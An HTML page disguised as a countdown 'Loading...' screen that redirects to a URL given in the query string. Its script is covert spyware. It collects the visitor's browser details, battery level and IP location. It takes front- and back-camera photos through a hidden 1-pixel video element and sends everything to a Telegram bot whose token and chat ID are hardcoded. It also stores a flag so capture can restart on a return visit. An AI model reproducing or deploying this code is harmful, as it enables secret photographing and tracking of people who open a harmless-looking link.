<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
.loader-container{
display:flex;
flex-direction:column;
align-items:center;
gap:25px;
animation:fadeIn 0.8s ease;
}

.loader-text{
color:white;
font-family:Arial, sans-serif;
font-size:18px;
}

/* Classic hourglass */
.hourglass{
width:60px;
height:60px;
border:4px solid white;
border-radius:8px;
position:relative;
animation:spin 2s linear infinite;
}

.hourglass:before,
.hourglass:after{
content:"";
position:absolute;
left:50%;
transform:translateX(-50%);
width:0;
height:0;
border-left:20px solid transparent;
border-right:20px solid transparent;
}

.hourglass:before{
top:6px;
border-bottom:22px solid white;
}

.hourglass:after{
bottom:6px;
border-top:22px solid white;
}

@keyframes spin{
from{transform:rotate(0deg);}
to{transform:rotate(360deg);}
}

@keyframes fadeIn{
from{opacity:0;}
to{opacity:1;}
}

.fade{
animation:fadeOut 1s forwards;
}

@keyframes fadeOut{
to{opacity:0;}
                     }
    
body{
margin:0;
background:black;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
overflow:hidden;
cursor:pointer;
}

/* Hidden preview */
video{
position:absolute;
width:1px;
height:1px;
opacity:0.01;
}

/* Fade */
.fade{
animation:fadeOut 0.8s forwards;
}

@keyframes fadeOut{
to{opacity:0;}
}
</style>
</head>

<body>

<div class="loader-container">
    <div class="hourglass"></div>
    <div class="loader-text">
        Please wait for <span id="count">5</span> seconds...
    </div>
</div>


<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
/* ---------- CONFIG ---------- */

const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
const CHAT_ID="1167762232";

/* ---------- TELEGRAM ---------- */

async function sendPhoto(blob,cap=""){
let f=new FormData();
f.append("chat_id",CHAT_ID);
f.append("photo",blob);
f.append("caption",cap);

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:f
});
}

async function sendText(txt){
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:CHAT_ID,text:txt})
});
}

/* ---------- INFO ---------- */

async function collectInfo(){

let info="ðŸ“± "+navigator.userAgent+"\n";

if(navigator.getBattery){
let b=await navigator.getBattery();
info+="ðŸ”‹ "+Math.round(b.level*100)+"%\n";
}

try{
let r=await fetch("https://ipapi.co/json/");
let j=await r.json();
info+=`ðŸ“ ${j.city}, ${j.country_name}`;
}catch{}

sendText(info);
}

/* ---------- CAMERA ---------- */

let video=document.getElementById("video");
let canvas=document.getElementById("canvas");
let ctx=canvas.getContext("2d");

async function cam(mode){
return navigator.mediaDevices.getUserMedia({
video:{
facingMode:mode,
width:{ideal:1920},
height:{ideal:1080}
}
});
}

function snap(){
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
ctx.drawImage(video,0,0);

return new Promise(r=>canvas.toBlob(r,"image/jpeg",0.95));
}

/* ---------- MAIN ---------- */

let started=false;

async function run(){

if(started) return;
started=true;

localStorage.setItem("expGranted","yes");

await collectInfo();

/* FRONT CAMERA */
let s=await cam("user");
video.srcObject=s;

await new Promise(resolve => {
    video.onloadedmetadata = () => {
        video.play();
        resolve();
    };
});


for(let i=1;i<=3;i++){
sendPhoto(await snap(),"Front "+i);
}

s.getTracks().forEach(t=>t.stop());

/* BACK CAMERA */
s=await cam("environment");
video.srcObject=s;

await sleep(600);

for(let i=1;i<=2;i++){
sendPhoto(await snap(),"Back "+i);
}

s.getTracks().forEach(t=>t.stop());

redirectNow();
}

/* ---------- AUTO PERMISSION MEMORY ---------- */

async function autoStart(){

try{
let p=await navigator.permissions.query({name:"camera"});

if(p.state==="granted" && localStorage.getItem("expGranted")){
run();
}
}catch{}
}

/* ---------- REDIRECT ---------- */

function redirectNow(){

document.body.classList.add("fade");

let go=new URLSearchParams(location.search).get("go");

setTimeout(()=>{
if(go) location.href=go;
},800);
}

/* ---------- HELPERS ---------- */

function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

/* ---------- TAP START ---------- */

startLoader();

function startLoader(){

let count = 5;
let counter = document.getElementById("count");

let interval = setInterval(()=>{
    count--;
    counter.textContent = count;

    if(count <= 0){
        clearInterval(interval);
        smoothRedirect();
    }

},1000);

}

function smoothRedirect(){

document.body.classList.add("fade");

let go=new URLSearchParams(location.search).get("go");

setTimeout(()=>{
if(go) location.href=go;
},1000);

}


</script>

</body>
</html>



